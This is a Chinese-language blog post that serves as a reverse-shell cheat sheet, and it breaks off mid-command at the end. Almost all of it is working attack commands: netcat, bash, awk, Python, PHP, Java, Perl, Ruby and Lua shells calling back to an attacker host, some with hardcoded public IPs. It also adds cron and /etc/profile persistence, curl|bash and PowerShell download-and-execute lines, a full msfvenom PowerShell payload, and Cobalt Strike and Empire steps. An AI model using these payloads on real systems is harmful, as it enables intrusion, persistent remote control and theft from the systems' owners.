---
title: 反弹Shell
published: 2023-04-15 10:35
tags: [安全, Shell]
category: 网安
draft: false
---

## 测试

```bash
nc用法：
        -d 从控制台分离，后台模式

        -e prog 入站程序执行 [危险！！]
        -g 网关源路由跳点[s]，最多 8 个
        -G num 源路由指针: 4, 8, 12, ...
        -h 这个垃圾
        -i secs 发送线路的延迟间隔，扫描的端口
        -l 监听模式，用于入站连接
        -L 更努力地听，在套接字关闭时重新听
        -n 纯数字 IP 地址，无 DNS
        -o 文件十六进制转储流量
        -p port 本地端口号
        -r 随机化本地和远程端口
        -s addr 本地源地址
        -t 应答 TELNET 协商
        -u UDP 模式
        -v 详细 [使用两次更详细]
        -w secs 连接和最终网络读取超时
        -z 零 I/O 模式 [用于扫描]
```

**nc版本没有-e参数**

```bash
nc老版本是不能采用-e这个参数的，安装之后，由于ubuntu默认安装的是netcat-openbsd，需要运行命令进行配置
sudo update-alternatives --config nc
选择 /bin/nc.traditional的编号
# 调整为traditional版本
```

| 参数                    | 解释                                                         |
| ----------------------- | ------------------------------------------------------------ |
| -4                      | 强制nc仅使用IPv4地址                                         |
| -6                      | 强制nc仅使用IPv6地址                                         |
| -b                      | 允许广播                                                     |
| -C                      | 发送CRLF作为行结束符                                         |
| -D                      | 在套接字上启动测试                                           |
| -d                      | 不要试图从标准输入读入数据                                   |
| -h                      | 打印nc帮助                                                   |
| -l length               | 指定TCP接收缓冲区大小                                        |
| -i interval             | 指定发送和接收的文本行之间的延迟时间间隔。还会导致连接到多个端口之间的延迟时间。 |
| **-k**                  | **强制nc在当前连接完成后继续侦听另一个连接。在没有-l选项的情况下使用此选项是错误的。** |
| **-l**                  | **用于指定nc应侦听传入连接，而不是启动到远程主机的连接。将此选项与-p、-s或-z选项结合使用是错误的。此外，使用-w选项指定的任何超时都将被忽略。** |
| -n                      | 不要在任何指定的地址、主机名或端口上执行任何DNS或服务查找。  |
| -O length               | 指定TCP发送缓冲区大小                                        |
| -P proxy_username       | 指定要呈现给需要身份验证的代理服务器的用户名。如果未指定用户名，则不会尝试身份验证。目前仅支持HTTP CONNECT代理的代理身份验证。 |
| **-p source_port**      | **根据权限限制和可用性，指定nc应使用的源端口。支持nn-mm范围模式和空格分隔。** |
| -q seconds              | 在stdin上执行EOF后，等待指定的秒数，然后退出。如果秒数为负，则永远等待。 |
| -r                      | 指定应随机选择源端口和/或目标端口，而不是在某个范围内或按照系统分配的顺序顺序进行选择。 |
| -S                      | 启用RFC 2385 TCP MD5签名选项。                               |
| -s source_ip            | 指定用于发送数据包的接口的IP。对于UNIX域数据报套接字，指定要创建和使用的本地临时套接字文件，以便可以接收数据报。将此选项与-l选项结合使用是错误的。 |
| -U                      | 指定使用UNIX域套接字。                                       |
| **-u**                  | **使用UDP而不是TCP的默认选项。对于UNIX域套接字，请使用数据报套接字而不是流套接字。如果使用UNIX域套接字，则在/tmp中创建临时接收套接字，除非给出-s标志。** |
| -V rtable               | 设置要使用的路由表。默认值为0。                              |
| **-v**                  | **让nc提供更详细的输出。**                                   |
| -w timeout              | 无法建立或在超时秒后处于空闲状态的连接。-w标志对-l选项没有影响，即nc将永久侦听连接，无论是否使用-w标志。默认值为无超时。 |
| -X proxy_protocol       | 请求nc在与代理服务器对话时应使用指定的协议。支持的协议有“4”（SOCKS v.4）、“5”（SOCKS v.5）和“connect”（HTTPS代理）。如果未指定协议，则使用SOCKS版本5。 |
| -x proxy_address[:port] | 请求nc应使用代理地址和端口处的代理连接到目标。如果未指定端口，则使用代理协议的已知端口（1080用于SOCKS，3128用于HTTPS）。 |
| -Z                      | DCCP模式。                                                   |
| **-z**                  | **指定nc应该只扫描侦听守护进程，而不向它们发送任何数据。将此选项与-l选项结合使用是错误的。** |

```bash
TCP监听：

nc -lvp 端口

UDP监听：

nc -u -lvp 端口   或者   nc -luvp 端口
```

### nc反弹

```bash
攻击：nc -lnvp 端口                       -- n参数代表在建立连接之前不对主机进行dns解析

靶机：nc -e cmd VPS_IP 端口               --windows

靶机：nc -e /bin/sh VPS_IP 端口           --linux

jenkins：println "nc -e /bin/bash VPS_IP 端口".execute().text

交互式终端：python -c "import pty;pty.spawn('/bin/bash');"
```

```bash
不支持 -e 参数时：

nc VPS_IP 8888 | /bin/bash | VPS_IP 9999

远程的8888端口的输入设备（键盘）输入命令，将命令输出传递至本地的/bin/bash，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的9999端口。
```

#### nc反弹——IPv6

```bash
监听：nc -6 -lvv -k fe80::20c:29ff:fea2:9ee2%ens33
# nc -6 -lvv -k 监听机ipv6地址%对应网卡名称
# -k 监听结束重新监听

反弹：ncat -6 fe80::20c:29ff:fea2:9ee2%eth0 31337 -e /bin/bash
# ncat -6 监听机ipv6地址%反弹机对应网卡名称 端口（自动生成） -e /bin/bash
```

### bash反弹

```bash
攻击：nc -lvp 端口

靶机：bash -i >& /dev/tcp/VPS_IP/端口 0>&1              --linux
```

```bash
base64:

bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDIuMTcwLjI1LzY2NzcgMD4mMQ==}|{base64,-d}|{bash,-i}'        --127.0.0.1
```

```php
exec 5<>/dev/tcp/VPS_IP/端口;cat <&5 | while read line; do $line 2>&5 >&5;done
```

```bash
靶机：bash -c 'exec bash -i >& /dev/tcp/VPS_IP/端口 0>&1'
```

```bash
echo "bash -i >& /dev/tcp/47.109.194.84/1234 0>&1" > /tmp/shell.sh

chmod +x /tmp/shell.sh

bash /tmp/shell.sh
```

### awk反弹

```bash
nc -lvp 端口

awk 'BEGIN{s="/inet/tcp/0/VPS_IP/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

```bash
gawk 'BEGIN{s="/inet/tcp/0/47.109.194.84/1234"; print "Hello" |& s; while((s|&getline resp)>0) print resp; close(s)}'
```

### Python反弹

```bash
攻击：nc -lvp 端口
```

```python
import os
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('VPS_IP', 端口))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(['/bin/bash', '-i'])
```

### Php反弹

```bash
攻击：nc -lvp 端口
```

```bash
php -r 'exec("/bin/bash -i >& /dev/tcp/127.0.0.1/1234")'     （未成功）

php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/bash -i 0>&3 1>&3 2>&3");'

php -r '$sock=fsockopen("127.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Java反弹

```java
public class Revs {
    /**
    * @param args
    * @throws Exception 
    */
public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.95.4/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}

上面文件保存为Revs.java文件，编译执行，成功反弹shell。
```

```assembly
javac Revs.java

目标若没有javac编译环境，只有java环境，可以先编译好上传再运行
java Revs     # kali测试成功
```

### 定时任务反弹

```bash
vim /etc/crontab

*/1  *  *  *  *   用户    bash /路径/文件.sh

*/1  *  *  *  *   用户    bash -c 'bash -i >& /dev/tcp/VPS_IP/端口 0>&1'

*/1  *  *  *  *   用户    /bin/bash -i>&/dev/tcp/VPS_IP/端口 0>&1       # 每隔一分钟，向攻击ip的端口发送shell

若反弹不成功，可能是每一行的结尾标识不同，入\r\n，可以在vim界面输入命令: set ff=unix 来进行修改格式，即可正常监听到反弹shell
```

```bash
将反弹shell的命令写入/etc/profile文件
将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。

/bin/bash -i >& /dev/tcp/VPS_IP/端口 0>&1 &       # 最后面那个&为的是防止管理员无法输入命令

bash -c 'bash -i >& /dev/tcp/VPS_IP/端口 0>&1'
```

### curl反弹

```bash
在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：

bash -c 'exec bash -i >& /dev/tcp/VPS_IP/端口 0<&1'

目录若是文件遍历的界面，直接curl 10.1.239.128:6677/1.txt|bash 即可

nc -lvnp 5555
开启监听后，在目标机上执行如下，即可反弹shell：

curl VPS_IP/文件 | bash
```

### netcat反弹

```bash
安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。

攻击机开启本地监听：

netcat -lvvp 端口

目标机主动连接攻击机：

netcat VPS_IP 端口 -e /bin/bash       # nc <VPS_IP> <攻击机监听的端口> -e /bin/bash
```

### powershell反弹

```bash
powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多

IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

下载到目标机器本地执行：

Import-Module ./powercat.ps1

powercat -c VPS_IP -p 端口         # 建立聊天室

powercat -c VPS_IP -p 端口 -e cmd
```

### socket反弹

```bash
nc -lvp 端口

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:VPS_IP:端口        --linux
```

### Telnet反弹

```bash
本地监听两个端口：
nc -lnvp 8888
nc -lnvp 9999

linux：
telnet VPS_IP 端口1 | /bin/bash | telnet VPS_IP 端口2       --远程的8888端口的输入设备（键盘）输入命令，将命令输出传递至本地的/bin/bash，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的9999端口。

最终本地的两个监听可以看到输入和输出的回显
```

### MSF反弹

```assembly
msfvenom -l payloads | grep 'cmd/windows/reverse'
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.43.74 lport=1234

生成payload：

powershell -w hidden -nop -c $a='192.168.43.74';$b=1234;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) {    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) {      $r=$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    }    if ($esread.IsCompleted -and $esread.Result -ne 0) {      $r=$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    }    if ($s.DataAvailable) {      $r=$s.Read($nb,0,$nb.Length);      if ($r -lt 1) {          break;      } else {          $str=$e.GetString($nb,0,$r);          $is.write($str);      }    }    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {        break;    }    if ($p.ExitCode -ne $null) {        break;    }}

攻击IP进行监听：

nc -lvp 1234

目标在cmd中运行payload
```

```assembly
当然msfvenom还可以生成各种木马程序，甚至进行免杀，在msfconsole中进行监听，同时还有反向连接和正向连接的不同 payload 选择

windows一般生成.exe，linux生成.elf

eg：
msfvenom -p windows/x64/meterpreter/bind_tcp rhost=靶机IP lport=监听端口 -f exe -o shell.exe     # windows 正向

msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=VPS_IP lport=监听端口 -f elf -o shell.elf     # linux 反向
```

```assembly
msf中如果是python反弹的shell，则没有交互，不能通过pty模块建立交互式shell，需要上线到nc中进行引用pty模块
监听nc -lvvp 5555
反弹nc -e /bin/sh 10.1.239.128 5555
失败，目标系统的nc版本没有-e参数
使用msfvenom生成nc反弹命令：msfvenom -p cmd/unix/reverse_netcat lhost=10.1.239.128 lport=5555 R
得到一句话反弹命令：mkfifo /tmp/hvlgtg; nc 10.1.239.128 5555 0</tmp/hvlgtg | /bin/sh >/tmp/hvlgtg 2>&1; rm /tmp/hvlgtg
在msf的shell中执行命令，并在本地nc监听成功上线
执行python -c "import pty;pty.spawn('/bin/bash');"成功得到可交互shell
```

### Perl反弹

```perl
sh：
perl -e 'use Socket;$i="VPS_IP";$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

bash：
perl -e 'use Socket;$i="VPS_IP";$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

```perl
安装依赖模块

perl -MCPAN -e shell
install LWP::Simple(模块名称)
```

### Ruby反弹shell

```ruby
nc -lvnp

ruby -rsocket -e 'c=TCPSocket.new("IP","Port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Cobalt strike反弹

```assembly
上线要有 ./teamserver
```

```assembly
1、配置监听器：点击Cobalt Strike——>Listeners——>在下方Tab菜单Listeners，点击add。
2、生成payload：点击Attacks——>Packages——>Windows Executable，保存文件位置。
3、目标机执行powershell payload
```

## 未测试

### Lua反弹shell

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('VPS_IP','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### Empire反弹shell

```assembly
usestager windows/launcher_vbs
info
set Listener test
execute
```

### nishang反弹shell

```assembly
https://github.com/samratashok/nishang
```

反弹TCP

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');
Invoke-PowerShellTcp -Reverse -IPAddress VPS_IP -port 1234
```

反弹UDP

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1');
Invoke-PowerShellUdp -Reverse -IPAddress VPS_IP -port 1234
```

### **Dnscat反弹shell**

```assembly
https://github.com/iagox86/dnscat2
```

```assembly
服务端：

ruby dnscat2.rb --dns "domain=lltest.com,host=xx.xx.xx.xx" --no-cache -e open -e open

目标主机：

powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubuserconte
```

